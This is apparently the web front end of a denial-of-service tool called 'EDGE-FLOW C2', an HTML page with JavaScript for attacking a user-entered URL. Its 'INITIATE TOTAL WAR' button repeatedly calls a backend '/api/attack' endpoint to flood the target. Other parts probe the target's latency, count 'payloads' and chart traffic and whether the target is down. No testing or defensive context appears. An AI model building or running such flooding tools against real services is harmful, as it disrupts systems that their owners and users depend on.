<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>☢️ EDGE-FLOW v10.0 NEXUS</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #030303; --panel: #0a0a0a; --border: #1a1a1a; --warn: #ff3e3e; --scan: #00d4ff; --recon: #f0f000; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: var(--neon); font-family: 'SF Pro Display', sans-serif; margin: 0; padding: 10px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 5px; border-bottom: 2px solid var(--border); margin-bottom: 10px; }
        #statusText { padding: 2px 8px; border-radius: 4px; border: 1px solid var(--neon); font-size: 0.8em; font-weight: bold; }
        .main-panel { display: flex; flex-direction: column; gap: 8px; flex-grow: 1; overflow-y: auto; }
        .control-block { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 12px; }
        label { display: block; margin-bottom: 4px; font-size: 0.7em; color: #666; text-transform: uppercase; }
        input { background: #000; border: 1px solid var(--border); color: var(--neon); padding: 12px; width: 100%; border-radius: 6px; font-size: 1em; outline: none; }
        .btn-group { display: grid; grid-template-columns: 2fr 1fr; gap: 8px; margin-top: 8px; }
        button { border-radius: 6px; border: none; font-weight: 800; text-transform: uppercase; cursor: pointer; transition: 0.1s; }
        #startBtn { background: var(--neon); color: #000; width: 100%; padding: 16px; font-size: 1.1em; margin-bottom: 5px; }
        #reconBtn { background: var(--recon); color: #000; padding: 12px; }
        #stopBtn { background: #1a1a1a; color: var(--warn); border: 1px solid var(--warn); padding: 12px; }
        
        /* 대시보드 레이아웃 */
        .dashboard { flex-grow: 1; display: grid; grid-template-rows: auto 1fr 1fr; gap: 8px; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        .stat-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 10px; text-align: center; }
        .stat-label { font-size: 0.6em; color: #555; margin-bottom: 2px; }
        .stat-value { font-size: 1.4em; font-weight: 800; letter-spacing: -1px; }
        
        .chart-box { background: #000; border: 1px solid var(--border); border-radius: 8px; padding: 8px; position: relative; min-height: 120px; }
        .chart-title { position: absolute; top: 5px; left: 10px; font-size: 0.6em; color: #444; z-index: 10; }
        #terminal { background: #050505; border: 1px solid #222; border-radius: 6px; padding: 5px; height: 50px; overflow-y: auto; font-family: monospace; font-size: 9px; }
    </style>
</head>
<body>
    <div class="header">
        <h1 style="margin:0; font-size:1em;">[ EDGE-FLOW C2 v10.0 ]</h1>
        <span id="statusText">READY</span>
    </div>

    <div class="main-panel">
        <div class="control-block">
            <label>TARGET COMMAND</label>
            <input type="text" id="target" value="http://" placeholder="http://target-ip/">
            <div class="btn-group">
                <button id="reconBtn" onclick="analyzeTarget()">RECON</button>
                <button id="stopBtn" onclick="terminate()">STOP</button>
            </div>
        </div>
        <button id="startBtn" onclick="initiate()">INITIATE TOTAL WAR</button>

        <div class="dashboard">
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-label">TOTAL PAYLOAD</div>
                    <div class="stat-value" id="shotCount">0</div>
                </div>
                <div class="stat-card">
                    <div class="stat-label">LATENCY (MS)</div>
                    <div class="stat-value" id="latencyDisplay">--</div>
                </div>
            </div>
            
            <div class="chart-box">
                <div class="chart-title">TRAFFIC LOAD (PPS)</div>
                <canvas id="trafficChart"></canvas>
            </div>
            
            <div class="chart-box">
                <div class="chart-title">TARGET LATENCY (MS)</div>
                <canvas id="latencyChart"></canvas>
            </div>
            
            <div id="terminal">>> Dual-Core Monitoring System Online...</div>
        </div>
    </div>

    <script>
        let attackInterval = null;
        let totalShots = 0;
        let lastShots = 0;
        let trafficChart, latencyChart;

        window.onload = function() {
            trafficChart = createChart('trafficChart', '#00ff41', 'PPS');
            latencyChart = createChart('latencyChart', '#f0f000', 'ms');
            
            // 1초마다 화력 그래프 업데이트
            setInterval(() => {
                if(attackInterval) {
                    const pps = totalShots - lastShots;
                    updateChart(trafficChart, pps);
                    lastShots = totalShots;
                }
            }, 1000);
        };

        function createChart(id, color, label) {
            const ctx = document.getElementById(id).getContext('2d');
            return new Chart(ctx, {
                type: 'line',
                data: { labels: Array(20).fill(''), datasets: [{ data: Array(20).fill(0), borderColor: color, borderWidth: 2, tension: 0.4, fill: true, backgroundColor: color + '11', pointRadius: 0 }] },
                options: { responsive: true, maintainAspectRatio: false, scales: { y: { beginAtZero: true, grid: { color: '#111' }, ticks: { display: false } }, x: { display: false } }, plugins: { legend: { display: false } } }
            });
        }

        function updateChart(chart, value) {
            chart.data.datasets[0].data.push(value);
            chart.data.datasets[0].data.shift();
            chart.update('none');
        }

        function log(msg, err = false) {
            const term = document.getElementById('terminal');
            const div = document.createElement('div');
            div.style.color = err ? 'var(--warn)' : 'var(--neon)';
            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            term.prepend(div);
        }

        async function analyzeTarget() {
            let target = document.getElementById('target').value.trim();
            if (!target.startsWith('http')) return;
            log("📡 SCANNING...");
            const start = Date.now();
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 5000);
                await fetch(target, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
                const ms = Date.now() - start;
                clearTimeout(timeout);
                updateLatency(ms);
            } catch (e) {
                const ms = Date.now() - start;
                if (ms < 5000) updateLatency(ms);
                else { updateLatency(9999); log("💀 DOWN", true); }
            }
        }

        function updateLatency(ms) {
            document.getElementById('latencyDisplay').innerText = ms === 9999 ? "DOWN" : ms;
            updateChart(latencyChart, ms === 9999 ? 0 : ms);
        }

        function initiate() {
            const target = document.getElementById('target').value.trim();
            if (!target.startsWith('http')) return;
            document.getElementById('statusText').innerText = "ANNIHILATING";
            document.getElementById('statusText').style.color = "var(--warn)";
            attackInterval = setInterval(() => {
                for(let i=0; i<50; i++) {
                    fetch(`/api/attack?target=${encodeURIComponent(target)}&cb=${Math.random()}`).then(() => {
                        totalShots += 15000;
                        document.getElementById('shotCount').innerText = totalShots.toLocaleString();
                    }).catch(()=>{});
                }
            }, 50);
        }

        function terminate() {
            clearInterval(attackInterval);
            document.getElementById('statusText').innerText = "READY";
            document.getElementById('statusText').style.color = "var(--neon)";
            log("🛑 STOPPED", true);
        }
    </script>
</body>
</html>
